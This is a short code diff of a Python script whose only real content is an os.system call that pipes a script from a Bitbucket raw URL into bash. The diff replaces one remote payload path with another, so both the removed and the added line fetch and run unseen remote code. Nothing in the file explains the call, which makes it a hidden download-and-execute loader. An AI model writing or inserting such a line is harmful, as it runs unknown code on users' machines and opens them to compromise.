@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/fertayaz/erenda/raw/037345c8201d1a25b79c9e4a9fea60bbc17b36c2/jajal | bash')
+os.system('curl -sL https://bitbucket.org/fertayaz/erenda/raw/1b9fca7ae93c41194fa5c811435bbb68f6a61e4c/maven | bash')
